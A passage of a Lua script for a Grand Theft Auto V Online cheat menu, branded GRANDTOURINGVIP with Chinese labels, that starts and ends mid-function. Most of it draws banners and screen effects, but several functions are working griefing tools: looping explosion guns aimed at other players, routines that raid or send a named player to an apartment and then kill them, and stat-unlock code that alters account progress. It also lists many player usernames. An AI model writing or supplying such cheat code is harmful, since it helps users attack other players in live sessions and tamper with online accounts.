        WEAPON._SET_WEAPON_DAMAGE_MODIFIER_THIS_FRAME(1119849093, 9999999999)
        local currentWpMem = memory.alloc()
        local junk = WEAPON.GET_CURRENT_PED_WEAPON(closestPed, currentWpMem, 1)
        local currentWP = memory.read_int(currentWpMem)
        memory.free(currentWpMem)
        WEAPON.SET_CURRENT_PED_WEAPON(closestPed, 1119849093, true)
        wait(1)
        WEAPON.SET_CURRENT_PED_WEAPON(closestPed, currentWP, true)
        ENTITY.SET_ENTITY_INVINCIBLE(closestPed, true)
        local group_id = PED.GET_PED_GROUP_INDEX(players.user_ped())
        PED.SET_PED_AS_GROUP_MEMBER(closestPed, group_id)
        PED.SET_PED_ACCURACY(closestPed, 90)
        ENTITY.ATTACH_ENTITY_TO_ENTITY(closestPed, players.user_ped(),
            PED.GET_PED_BONE_INDEX(players.user_ped(), 0x6b52), 0, -0.25, 1.95, 0, 0, 0, true, true, true, true, 2, true)
        STREAMING.REQUEST_ANIM_DICT("weapons@first_person@aim_idle@p_m_zero@heavy@minigun@aim_trans@idle_to_rng")
        TASK.TASK_PLAY_ANIM(closestPed, "weapons@first_person@aim_idle@p_m_zero@heavy@minigun@aim_trans@idle_to_rng",
            "aim_trans_med", 1000.0, -1.5, -1, 1, 0.445, false, false, false)
        PED.REGISTER_HATED_TARGETS_AROUND_PED(closestPed, 1000)
        PED.SET_PED_ALLOWED_TO_DUCK(closestPed, false)
        PED.SET_PED_ALERTNESS(closestPed, 100)
        PED.SET_PED_COMBAT_RANGE(closestPed, 1000)
        local firepattern = util.joaat("FIRING_PATTERN_FULL_AUTO")
        PED.SET_PED_FIRING_PATTERN(closestPed, firepattern)
        PED.SET_PED_RAGDOLL_ON_COLLISION(closestPed, false)
        PED.SET_PED_CAN_RAGDOLL(closestPed, false)
        PED.SET_PED_COMBAT_MOVEMENT(closestPed, 0)
        ENTITY.SET_ENTITY_COLLISION(closestPed, false, false)
    else
        entities.delete_by_handle(closestPed)
    end
end
function renderer_triangle(v2_A, v2_B, v2_C, clr)
	clr.a = 0.15
    function i(j,k,l)
        m=(k.y-j.y)*(l.x-k.x)-(k.x-j.x)*(l.y-k.y)
        if m<0 then return true end
        return false
    end
    if i(v2_A,v2_B,v2_C) then directx.draw_triangle(v2_A.x,v2_A.y,v2_B.x,v2_B.y,v2_C.x,v2_C.y,clr)
    elseif i(v2_A,v2_C,v2_B) then directx.draw_triangle(v2_A.x,v2_A.y,v2_C.x,v2_C.y,v2_B.x,v2_B.y,clr)
    elseif i(v2_B,v2_C,v2_A) then directx.draw_triangle(v2_B.x,v2_B.y,v2_C.x,v2_C.y,v2_A.x,v2_A.y,clr)
    elseif i(v2_B,v2_A,v2_C) then directx.draw_triangle(v2_B.x,v2_B.y,v2_A.x,v2_A.y,v2_C.x,v2_C.y,clr)
    elseif i(v2_C,v2_A,v2_B) then directx.draw_triangle(v2_C.x,v2_C.y,v2_A.x,v2_A.y,v2_B.x,v2_B.y,clr)
    else directx.draw_triangle(v2_C.x,v2_C.y,v2_B.x,v2_B.y,v2_A.x,v2_A.y,clr) end
end
function hsvToRGB(h, s, v)
    local r, g, b
    local i = math.floor(h * 6);
    local f = h * 6 - i;
    local p = v * (1 - s);
    local q = v * (1 - f * s);
    local t = v * (1 - (1 - f) * s);
    i = i % 6
    if i == 0 then r, g, b = v, t, p
    elseif i == 1 then r, g, b = q, v, p
    elseif i == 2 then r, g, b = p, v, t
    elseif i == 3 then r, g, b = p, q, v
    elseif i == 4 then r, g, b = t, p, v
    elseif i == 5 then r, g, b = v, p, q
    end
	return {["r"] = r,["g"] = g,["b"] = b,["a"] = 0.15}
end
function w2sfunc(vecx,vecy,vecz)
	xe,ye = memory.alloc(4),memory.alloc(4)
	result = GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(vecx, vecy, vecz, xe, ye) 
	e = {['x'] = memory.read_float(xe),['y'] = memory.read_float(ye),['z'] = 0}
	memory.free(xe)
	memory.free(ye)
	if not result then e = {0,0,0} end
	return e
end
function world_circle(origin, size)
    if origin.x == nil then
        return
    end
	origin.z = origin.z + 0.05
    last_point = nil
    gradient_g = hat_gradient
    color_g = hat_clr
    for i = 0, 360, 5 do
        new_point = {
            ['x'] = origin.x - (math.sin(math.rad(i)) * size),
            ['y'] = origin.y - (math.cos(math.rad(i)) * size),
            ['z'] = origin.z
        }
        actual_color = color_g
        if (gradient_g) then
            hue_offset = 0
            hue_offset = (((util.current_time_millis()/500) * (hat_speed * 50)) + i) % 360
            hue_offset = math.min(360, math.max(0, hue_offset))
            klr = hsvToRGB(hue_offset / 360, 1, 1)
            color_g = klr
        end
        if last_point ~= nil then 
            old_screen_point = w2sfunc(last_point.x, last_point.y, last_point.z)
            new_screen_point = w2sfunc(new_point.x, new_point.y, new_point.z)
            origin_screen_point = w2sfunc(origin.x, origin.y, origin.z + 0.2)
            if old_screen_point.x ~= nil and new_screen_point.x ~= nil and origin_screen_point.x ~= nil then
                renderer_triangle({['x'] = old_screen_point.x, ['y'] = old_screen_point.y,['z'] =0}, {['x'] =new_screen_point.x, ['y'] = new_screen_point.y,['z'] =0}, {['x'] = origin_screen_point.x, ['y'] = origin_screen_point.y,['z'] =0}, color_g)     
                bals = color_g
				bals.a = 1
				directx.draw_line(old_screen_point.x, old_screen_point.y, new_screen_point.x, new_screen_point.y, bals)
            end
        end
        last_point = new_point
    end
end
function run(p)
	ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(p)
	e = ENTITY.GET_WORLD_POSITION_OF_ENTITY_BONE(ped,PED.GET_PED_BONE_INDEX(ped,0x796E),0,0,0)
	world_circle(e, 0.28)
end
function friend(p)
	handle_ptr = memory.alloc(52)
	NETWORK.NETWORK_HANDLE_FROM_PLAYER(p, handle_ptr, 13)
	yes = NETWORK.NETWORK_IS_FRIEND(handle_ptr)
	memory.free(handle_ptr)
	return yes
end
--
function unlock_packed_bools(from, to)
    for i = from, to do
        STATS.SET_PACKED_STAT_BOOL_CODE(i, true, util.get_char_slot())
    end
end
project_3d_coord = function (coord)
    local x_ptr, y_ptr = memory.alloc_int(), memory.alloc_int()
    local status = GRAPHICS.GET_SCREEN_COORD_FROM_WORLD_COORD(coord.x, coord.y, coord.z, x_ptr, y_ptr)
    local x, y = memory.read_float(x_ptr), memory.read_float(y_ptr)
    return status, v2(x, y)
end
function renwuegaoqiang1()
    sheji=GTTG(weaponfun, '人物恶搞枪[火]', {''}, '只适用于人物跟玩家,载具内的对象不起效果', function(ak)
    wuqi = ak
        while wuqi do
            wait()
               if PED.IS_PED_SHOOTING(players.user_ped(players.user())) then
                  local controls_entity_aimed_at = ent_func.get_entity_player_is_aiming_at(players.user())
                      if ENTITY.IS_ENTITY_A_PED(controls_entity_aimed_at) or PED.IS_PED_A_PLAYER(controls_entity_aimed_at)  then
                      util.create_thread(function()
                          while wuqi do
                             wait()
                             FIRE.ADD_EXPLOSION(ENTITY.GET_ENTITY_COORDS(controls_entity_aimed_at).x,
                          ENTITY.GET_ENTITY_COORDS(controls_entity_aimed_at).y,
                      ENTITY.GET_ENTITY_COORDS(controls_entity_aimed_at).z-0.5, 12,1, true, false,0, true)
                      end
                  end)
               end
            end
        end
        wuqi = false
    end)
end
function renwuegaoqiang2()
    GTTG(weaponfun, '人物恶搞枪[水]', {''}, '只适用于人物跟玩家,载具内的对象不起效果', function(ak)
    wuqi = ak
        while wuqi do
            wait()
               if PED.IS_PED_SHOOTING(players.user_ped(players.user())) then
                  local controls_entity_aimed_at = ent_func.get_entity_player_is_aiming_at(players.user())
                      if ENTITY.IS_ENTITY_A_PED(controls_entity_aimed_at) or PED.IS_PED_A_PLAYER(controls_entity_aimed_at)  then
                      util.create_thread(function()
                          while wuqi do
                             wait()
                             FIRE.ADD_EXPLOSION(ENTITY.GET_ENTITY_COORDS(controls_entity_aimed_at).x,
                          ENTITY.GET_ENTITY_COORDS(controls_entity_aimed_at).y,
                      ENTITY.GET_ENTITY_COORDS(controls_entity_aimed_at).z-0.5, 13,1, true, false,0, true)
                      end
                  end)
               end
            end
        end
        wuqi = false
    end)
end    
--至臻横幅
function sxgt(f, sxpid)
    starttime8 = os.time()
    local rainbowr = 255
    local rainbowg = 255
    local rainbowb = 255
    local startX = -0.5
    local endX = 0.5
    local speed = 0.001
    hfgt8 = f
    while hfgt8 do
        wait()
        startX = startX + speed
        endX = endX + speed
        if startX >= 0.5 then
            startX = -0.5
            endX = 0.5
        end
        rainbowr = rainbowr + math.random(0, 8)
        rainbowg = rainbowg + math.random(0, 8)
        rainbowb = rainbowb + math.random(0, 8)
        if rainbowr > 255 then
        rainbowr = rainbowr - 255
        end
        if rainbowg > 255 then
        rainbowg = rainbowg - 255
        end
        if rainbowb > 255 then
        rainbowb = rainbowb - 255
        end
        local time = os.clock() * 3
        local r = math.floor(127 + 127 * math.sin(time))
        local g = math.floor(127 + 127 * math.sin(time + 2))
        local b = math.floor(127 + 127 * math.sin(time + 4))
        GRAPHICS.DRAW_RECT(.5, .37, 1, 0.033, r, g, b, 255)
        local time = os.clock() * 5
        local r = math.floor(127 + 127 * math.sin(time))
        local g = math.floor(127 + 127 * math.sin(time + 2))
        local b = math.floor(127 + 127 * math.sin(time + 4))
        GRAPHICS.DRAW_RECT(.5, .38, 1, 0.033, r, g, b, 255)
        local time = os.clock() * 7
        local r = math.floor(127 + 127 * math.sin(time))
        local g = math.floor(127 + 127 * math.sin(time + 2))
        local b = math.floor(127 + 127 * math.sin(time + 4))
        GRAPHICS.DRAW_RECT(.5, .39, 1, 0.033, r, g, b, 255)
        local time = os.clock() * 9
        local r = math.floor(127 + 127 * math.sin(time))
        local g = math.floor(127 + 127 * math.sin(time + 2))
        local b = math.floor(127 + 127 * math.sin(time + 4))
        GRAPHICS.DRAW_RECT(.5, .40, 1, 0.033, r, g, b, 255)
        local time = os.clock() * 12
        local r = math.floor(127 + 127 * math.sin(time))
        local g = math.floor(127 + 127 * math.sin(time + 2))
        local b = math.floor(127 + 127 * math.sin(time + 4))
        GRAPHICS.DRAW_RECT(.5, .41, 1, 0.033, r, g, b, 255)
        local time = os.clock() * 15
        local r = math.floor(127 + 127 * math.sin(time))
        local g = math.floor(127 + 127 * math.sin(time + 2))
        local b = math.floor(127 + 127 * math.sin(time + 4))
        GRAPHICS.DRAW_RECT(.5, .42, 1, 0.033, r, g, b, 255)
        local time = os.clock() * 17
        local r = math.floor(127 + 127 * math.sin(time))
        local g = math.floor(127 + 127 * math.sin(time + 2))
        local b = math.floor(127 + 127 * math.sin(time + 4))
        GRAPHICS.DRAW_RECT(.5, .43, 1, 0.033, r, g, b, 255)
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.085, 0.10)
        HUD.SET_TEXT_SCALE(0.5, 0.4)
        HUD.SET_TEXT_FONT(0)
        HUD.SET_TEXT_CENTRE(1)
        HUD.SET_TEXT_OUTLINE(0)
        HUD.SET_TEXT_COLOUR(255, 255, 255, 255)
        if sxpid == "hinrcituqzQZ" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~y~至臻皇榜 清歌 正在该战局")
        elseif sxpid == "chen_you123" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~y~至臻皇榜 辰悠 正在该战局")
        elseif sxpid == "rudan891018" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~y~湾湾 正在该战局")
        elseif sxpid == "An_owQ" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~q~Lin带着好大儿瑞思拜进入了战局")
        elseif sxpid == "Mag7777V" or sxpid == "Magicswordstar" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~y~闪耀至臻管理员 正在该战局")
        elseif sxpid == "RhymeBear" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~italic~~h~~y~菲奥娜K1ng ~r~正在逆袭战局")
        elseif sxpid == "Gods_daxiong" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~y~至臻皇榜 明月 正在该战局")
        elseif sxpid == "YuukiAsuna17" then 
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~q~执掌神判的 YuukiAsuna17 在此降临")
        elseif sxpid == "xyzkzero" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~q~执掌神判的 xyzkzero 在此降临")
        elseif sxpid == "-ZackFair-" or sxpid == "Msinc" or sxpid == "Msincer" or sxpid == "WXH_666" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~y~至臻皇榜 人生若只如初见 正在逆袭战局")
        elseif sxpid == "XiaoYuXin_qwq" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~italic~~h~~y~小~q~雨~b~祝~p~战~r~局~y~里~q~的~b~GT~p~玩~r~家~y~玩~q~的~r~开~b~心")
        elseif sxpid == "ghosts_009" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~y~忽有故人心上过，回首山河已是冬")
        elseif sxpid == "zxzppq" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~r~中华人民共和国万岁")
        elseif sxpid == "Doll0v0" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~q~妹妹最爱的Doll0v0正在此战局")
        elseif sxpid == "Herykcz" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~q~妹妹最爱的Herykcz正在此战局")
        elseif sxpid == "kingpo030715" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~y~救世主kingpo加入了战局")
        elseif sxpid == "sshanheya" then
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~q~妹妹最爱的至臻皇榜在此战局")
        else
            util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~~y~至臻皇榜 "..sxpid.." 正在该战局")
        end
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(startX + 0.5, 0.380)
        if os.time() - starttime8 >= 12 then
            hfgt8 = false
            return
        end
    end
end
function hengfugt(f, targetplayer)
    local starttime = os.time()
    local startX = -0.5
    local endX = 0.5
    local speed = 0.001
    hfgt = f
    while hfgt do
        wait()
        startX = startX + speed
        endX = endX + speed
        if startX >= 0.5 then
            startX = -0.5
            endX = 0.5
        end
        GRAPHICS.DRAW_RECT(.5, .47, 1, 0.01, 255, 0, 0, 255)
        GRAPHICS.DRAW_RECT(.5, .48, 1, 0.01, 255, 128, 0, 255)
        GRAPHICS.DRAW_RECT(.5, .49, 1, 0.01, 255, 255, 0, 255)
        GRAPHICS.DRAW_RECT(.5, .50, 1, 0.01, 0, 255, 0, 255)
        GRAPHICS.DRAW_RECT(.5, .51, 1, 0.01, 0, 255, 255, 255)
        GRAPHICS.DRAW_RECT(.5, .52, 1, 0.01, 0, 75, 255, 255)
        GRAPHICS.DRAW_RECT(.5, .53, 1, 0.01, 128, 0, 255, 255)
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.085, 0.10)
        HUD.SET_TEXT_SCALE(0.5, 0.4)
        HUD.SET_TEXT_FONT(0)
        HUD.SET_TEXT_CENTRE(1)
        HUD.SET_TEXT_OUTLINE(0)
        HUD.SET_TEXT_COLOUR(255, 255, 255, 255)
        util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~GTVIP皇榜会员 " .. targetplayer .. " 正在该战局")
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(startX + 0.5, 0.480)
        if os.time() - starttime >= 7 then
            hfgt = false
            return
        end
    end
end
--开发横幅
function devhengfu(f, devt)
    local starttime = os.time()
    local startX = -0.5
    local endX = 0.5
    local speed = 0.001
    devhf = f
    while devhf do
        wait()
        startX = startX + speed
        endX = endX + speed
        if startX >= 0.5 then
            startX = -0.5
            endX = 0.5
        end
        GRAPHICS.DRAW_RECT(.5, .30, 1, 0.05, 255, 90, 160, 255)
        GRAPHICS.DRAW_RECT(.5, .31, 1, 0.05, 255, 160, 190, 255)
        GRAPHICS.DRAW_RECT(.5, .33, 1, 0.011, 255, 90, 160, 255)
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.085, 0.10)
        HUD.SET_TEXT_SCALE(0.5, 0.45)
        HUD.SET_TEXT_FONT(0)
        HUD.SET_TEXT_CENTRE(1)
        HUD.SET_TEXT_OUTLINE(0)
        HUD.SET_TEXT_COLOUR(255, 255, 255, 255)
        util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~GTVIP开发人员 " .. devt .. " 正在该战局")
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(startX + 0.5, 0.285)
        if os.time() - starttime >= 6 then
            devhf = false
            return
        end
    end
end
--入侵载具
function control_vehicle(pid, output_toast, callback, opts)
    local vehicle = ent_func.get_player_vehicle_in_control(pid, opts)
    if vehicle ~= 0 then
        callback(vehicle)
        return true
    else
        if output_toast then
            gtoast("被随机锁定的玩家并不在载具内")
        end
        return false
    end
end
--车辆进入枪
function driveitgun()
	entitodrive = memory.alloc_int()
	if PLAYER.GET_ENTITY_PLAYER_IS_FREE_AIMING_AT(PLAYER.PLAYER_ID(), entitodrive) then
		if PAD.IS_CONTROL_PRESSED(1, 23) then
			PED.SET_PED_INTO_VEHICLE(plyped(), memory.read_int(entitodrive), -1)
		end
	end
	memory.free(entitodrive)
end
--启动页面3
function huanyingjiemian(f) 
    local rainbowr = 255
    local rainbowg = 255
    local rainbowb = 255
    local startX = 0.5     
    local endX = 0.5      
    local startY = -0.15     
    local endY = 0.01 
    local speed = 0.0005
    hfgt = f
    local timer = os.clock() 
    while hfgt and os.clock() - timer <= 4 do 
        wait()
        startY = startY + speed 
        endY = endY + speed 
        if startY >= 0.3 then
            startY = -0.1
            endY = -0.1
        end
        rainbowr = rainbowr + math.random(0, 8)
        rainbowg = rainbowg + math.random(0, 8)
        rainbowb = rainbowb + math.random(0, 8)
        if rainbowr > 255 then
        rainbowr = rainbowr - 255
        end
        if rainbowg > 255 then
        rainbowg = rainbowg - 255
        end
        if rainbowb > 255 then
        rainbowb = rainbowb - 255
        end
        GRAPHICS.DRAW_RECT(startX, startY + 0.23, 1, 0.03, 255, 0, 0, 200) --红
        GRAPHICS.DRAW_RECT(startX, startY + 0.26, 1, 0.03, 255, 128, 0, 200) --橙
        GRAPHICS.DRAW_RECT(startX, startY + 0.29, 1, 0.03, 255, 255, 0, 200) --黄
        GRAPHICS.DRAW_RECT(startX, startY + 0.32, 1, 0.03, 0, 255, 0, 200) --绿
        GRAPHICS.DRAW_RECT(startX, startY + 0.35, 1, 0.03, 0, 255, 255, 200) --青
        GRAPHICS.DRAW_RECT(startX, startY + 0.38, 1, 0.03, 0, 75, 255, 200) --蓝
        GRAPHICS.DRAW_RECT(startX, startY + 0.41, 1, 0.03, 128, 0, 255, 200) --紫
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.085, 0.10)
        HUD.SET_TEXT_SCALE(0.5, 2.1)
        HUD.SET_TEXT_FONT(0)
        HUD.SET_TEXT_CENTRE(1)
        HUD.SET_TEXT_OUTLINE(0)
        HUD.SET_TEXT_COLOUR(rainbowr, rainbowg, rainbowb, 200)
        util.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("~h~GRANDTOURINGVIP")
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(startX, startY + 0.23) 
    end
end
--
hyhandler = util.create_tick_handler(function()
    local alert_screen = GRAPHICS.REQUEST_SCALEFORM_MOVIE("MP_BIG_MESSAGE_FREEMODE")
    local yPositionUp = -0.05
    local yPositionDown = 0.40
    local i = 0
    while i < 300 do
        local combinedText =
            "~h~~r~∑~y~G~g~R~q~A~p~N~f~D~p~T~g~O~b~U~q~R~p~I~k~N~g~G~p~V~y~I~g~P~r~∑~r~\n~h~~g~[" ..
                PLAYER.GET_PLAYER_NAME(players.user()) .. "]~y~VIP∑"
        combinedText = combinedText:gsub("\n%s*", "\n") -- 移除换行后的空格
        GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(alert_screen, "SHOW_SHARD_WASTED_MP_MESSAGE")
        GRAPHICS.DRAW_SCALEFORM_MOVIE(alert_screen, 0.5, yPositionUp, 1, 1, 255, 225, 255, 255)
        GRAPHICS.DRAW_SCALEFORM_MOVIE(alert_screen, 0.5, yPositionUp, 1, 1, 255, 225, 255, 255)
        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(combinedText)
        GRAPHICS.END_SCALEFORM_MOVIE_METHOD(alert_screen)
        i = i + 1
        yPositionUp = yPositionUp + 0.0015
        wait()
    end
    local i = 0
    while i < 300 do
        local combinedText =
            "~h~~r~∑~y~G~g~R~q~A~p~N~f~D~p~T~g~O~b~U~q~R~p~I~k~N~g~G~p~V~y~I~g~P~r~∑~r~\n~h~~g~[" ..
                PLAYER.GET_PLAYER_NAME(players.user()) .. "]~y~VIP∑"
        combinedText = combinedText:gsub("\n%s*", "\n") -- 移除换行后的空格
        GRAPHICS.BEGIN_SCALEFORM_MOVIE_METHOD(alert_screen, "SHOW_SHARD_WASTED_MP_MESSAGE")
        GRAPHICS.DRAW_SCALEFORM_MOVIE(alert_screen, 0.5, yPositionDown, 1, 1, 255, 225, 255, 255)
        GRAPHICS.DRAW_SCALEFORM_MOVIE(alert_screen, 0.5, yPositionDown, 1, 1, 255, 225, 255, 255)
        GRAPHICS.SCALEFORM_MOVIE_METHOD_ADD_PARAM_TEXTURE_NAME_STRING(combinedText)
        GRAPHICS.END_SCALEFORM_MOVIE_METHOD(alert_screen)
        i = i + 1
        yPositionDown = yPositionDown - 0.0015
        wait()
    end
    wait()
    util.stop_thread()
end)
--hundouluo
function hunhuan9()
    hunhuan()
    hunhuan1()
    hunhuan2()
    hunhuan3()
    hunhuan4()
    hunhuan5()
    hunhuan6()
    hunhuan7()
    hunhuan8()
end
--强制云保存
function savedata()
    menu.trigger_commands("forcecloudsave")
end
--忍者枪
function request_animation(hash)
    STREAMING.REQUEST_ANIM_DICT(hash)
    while not STREAMING.HAS_ANIM_DICT_LOADED(hash) do
        util.yield()
    end
end
--实体管理
function fixveh( vehicle )
	vel = ENTITY.GET_ENTITY_VELOCITY(vehicle)
	VEHICLE.SET_VEHICLE_FIXED(vehicle)
	VEHICLE.SET_VEHICLE_ENGINE_HEALTH(vehicle, 1000)
	ENTITY.SET_ENTITY_VELOCITY(vehicle, vel.x, vel.y, vel.z)
end
--截货
function takerestore(pid)
    menu.trigger_commands("raid" .. players.get_name(pid))
    wait(5000)
    menu.trigger_commands("kill" .. players.get_name(pid))
end
--送回家暴毙
function takehome(pid)
    menu.trigger_commands("aptme" .. players.get_name(pid))
    wait(10000)
    menu.trigger_commands("kill" .. players.get_name(pid))
end
--扫描
function saomiaoziti(f)
saomiao = f
while saomiao do
wait() 
saomiao = true 
if saomiao then 
    local text = "~h~~r~正在扫描你的身份..." 
    for i = 0, string.len(text) do 
        local subtext = string.sub(text, 1, i) 
        HUD.SET_TEXT_SCALE(3.0,1.5) 
        HUD.SET_TEXT_FONT(0) 
        HUD.SET_TEXT_CENTRE(1) 
        HUD.SET_TEXT_OUTLINE(0) 
        HUD.SET_TEXT_COLOUR(60, 255, 255, 255) 
        HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING") 
        HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(subtext) 
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0.53,0.15,0) 
        wait(10) 
    end 
end
end
end
function smyuan(f)
    local v3=v3.new
    local radius1 = 0.5
    local radius2 = 0.5
    local numSegments = 1000
    local segmentAngle = 360 / numSegments
    local centerY1 = 0
    local centerY2 = 0
    local centerY3 = 0
    local centerY4 = 0
    local speed1 = 0.030
    local speed2 = 0.030
    local speed3 = 0.030
    local speed4 = 0.030
    saomiao1 = f
    while saomiao1 do
    wait(0)
         local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
         centerY1 = centerY1 + speed1
         if centerY1 > 0.8 then
              speed1 = -0.030
         elseif centerY1 < -1 then
              speed1 = 0.030
         end
         centerY2 = centerY2 + speed2
         if centerY2 > 0.6 then
              speed2 = -0.030
         elseif centerY2 < -1 then
              speed2 = 0.030
         end
         centerY3 = centerY3 + speed3
         if centerY3 > 1.0 then
              speed3 = -0.030
         elseif centerY3 < -1 then
              speed3 = 0.030
         end
         centerY4 = centerY4 + speed4
         if centerY4 > 0.4 then
              speed4 = -0.030
         elseif centerY4 < -1 then
              speed4 = 0.030
         end
         for i = 1, numSegments do
             local angle1 = math.rad((i-1) * segmentAngle)
             local angle2 = math.rad(i * segmentAngle)
             local x1 = radius1 * math.cos(angle1)
             local y1 = radius1 * math.sin(angle1)
             local x2 = radius1 * math.cos(angle2)
             local y2 = radius1 * math.sin(angle2)
             GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1 , c.z+0.2+ centerY1, c.x + x2, c.y + y2 , c.z+0.1+ centerY1, 0, 255, 0, 255)
             x1 = radius2 * math.cos(angle1)
             y1 = radius2 * math.sin(angle1)
             x2 = radius2 * math.cos(angle2)
             y2 = radius2 * math.sin(angle2)
             GRAPHICS.DRAW_LINE(c.x + x1, c.y + y1 , c.z+0.2+ centerY2, c.x + x2, c.y + y2 , c.z+0.1+ centerY2, 255, 255, 0, 255)
             cx1 = radius2 * math.cos(angle1)
             cy1 = radius2 * math.sin(angle1)
             cx2 = radius2 * math.cos(angle2)
             cy2 = radius2 * math.sin(angle2)
             GRAPHICS.DRAW_LINE(c.x + cx1, c.y + cy1 , c.z+0.2+ centerY3, c.x + cx2, c.y + cy2 , c.z+0.1+ centerY3, 255, 0, 0, 255)
             dx1 = radius2 * math.cos(angle1)
             dy1 = radius2 * math.sin(angle1)
             dx2 = radius2 * math.cos(angle2)
             dy2 = radius2 * math.sin(angle2)
             GRAPHICS.DRAW_LINE(c.x + dx1, c.y + dy1 , c.z+0.2+ centerY4, c.x + dx2, c.y + dy2 , c.z+0.1+ centerY4, 0, 255, 255, 255)
         end
    end
    end
--帮会等级
function get_stat_int(stat)
    local ptr = memory.alloc_int()
    STATS.STAT_GET_INT(util.joaat(stat), ptr, -1)
    return memory.read_int(ptr)
end
function set_stat_int(stat, value)
    STATS.STAT_SET_INT(util.joaat(stat), value, true)
end
--友好载具类型
Vehicle_MissionType = {
    ListItem = {
        { "巡航",             {}, "巡航" },
        { "猛撞",                {}, "猛撞" },
        { "阻挡",              {}, "阻挡" },
        { "前往",              {}, "前往" },
        { "停止",               {}, "停止" },
        { "攻击",             {}, "攻击" },
        { "跟随",             {}, "跟随" },
        { "逃跑",               {}, "逃跑" },
        { "围绕",             {}, "围绕" },
        { "左边护送",        {}, "左边护送" },
        { "右边护送",       {}, "右边护送" },
        { "后面护送",        {}, "后面护送" },
        { "前面护送",       {}, "前面护送" },
        { "参加比赛",       {}, "参加比赛" },
        { "跟踪录制",   {}, "跟踪录制" },
        { "警察行为",   {}, "警察行为" },
        { "原地打转", {}, "原地打转" },
        { "并行停车",      {}, "并行停车" },
        { "降落",               {}, "降落" },
        { "降落并等待",      {}, "降落并等待" },
        { "碰撞",              {}, "碰撞" },
        { "靠边停车",          {}, "靠边停车" },
        { "保护",            {}, "保护" },
    },
    ValueList = {
        1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23,
    }
}
---@param ped Ped
function disable_ped_flee_attributes(ped)
    if ENTITY.DOES_ENTITY_EXIST(ped) and ENTITY.IS_ENTITY_A_PED(ped) then
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 6, false)  -- FLEE_WHILST_IN_VEHICLE
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 17, false) -- ALWAYS_FLEE
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 46, true)  -- CAN_FIGHT_ARMED_PEDS_WHEN_NOT_ARMED
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 58, true)  -- DISABLE_FLEE_FROM_COMBAT
        PED.SET_PED_COMBAT_ATTRIBUTES(ped, 78, true)  -- DISABLE_ALL_RANDOMS_FLEE
        PED.SET_PED_FLEE_ATTRIBUTES(ped, 512, true)   -- NEVER_FLEE
    end
end
--载具内敌人攻击
---@param pedType int
---@param modelHash Hash
---@param x float
---@param y float
---@param z float
---@param heading float
---@return Ped
function Create_Network_Ped(pedType, modelHash, x, y, z, heading)
    request_model(modelHash)
    local ped = PED.CREATE_PED(pedType, modelHash, x, y, z, heading, true, true)
    ENTITY.SET_ENTITY_LOAD_COLLISION_FLAG(ped, true)
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(ped, true, false)
    ENTITY.SET_ENTITY_SHOULD_FREEZE_WAITING_ON_COLLISION(ped, true)
    NETWORK.NETWORK_REGISTER_ENTITY_AS_NETWORKED(ped)
    local net_id = NETWORK.PED_TO_NET(ped)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(net_id, true)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(net_id, true)
    for _, pid in pairs(players.list()) do
        NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(net_id, pid, true)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(modelHash)
    return ped
end
---增强NPC作战能力
---@param ped Ped
---@param isGodmode boolean? [default = false]
---@param canRagdoll boolean? [default = true]
function increase_ped_combat_ability(ped, isGodmode, canRagdoll)
    if isGodmode == nil then isGodmode = false end
    if canRagdoll == nil then canRagdoll = true end
    if ENTITY.DOES_ENTITY_EXIST(ped) and ENTITY.IS_ENTITY_A_PED(ped) then
        ENTITY.SET_ENTITY_INVINCIBLE(ped, isGodmode)
